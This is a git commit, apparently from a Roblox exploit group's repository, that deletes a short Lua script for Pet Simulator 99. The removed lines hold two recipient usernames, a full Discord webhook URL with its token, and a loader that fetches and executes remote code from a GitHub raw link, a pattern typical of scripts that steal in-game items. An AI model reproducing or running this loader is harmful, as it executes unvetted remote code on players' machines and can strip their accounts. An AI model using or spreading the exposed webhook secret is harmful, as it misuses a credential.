403c4b0ebe13c6dd51e35d130226a34afb2f30e2
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-24 08:54:29 +0200

    Delete ps99/Hugehunter.script.lua.lua

--- ps99/Hugehunter.script.lua.lua
+++
@@ -1,5 +0,0 @@
-Username = "RPX_ANONYMOUS11"
-Username2 = "RPX_UNIMOUS"
-Webhook = "https://canary.discord.com/api/webhooks/1362978092636832024/wVNvKB_555b2rZLtHAUMyy5gbuRYKIBor1Ilnm23KaajusdL0wSdjniwOXJVLjw8I-Ql"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
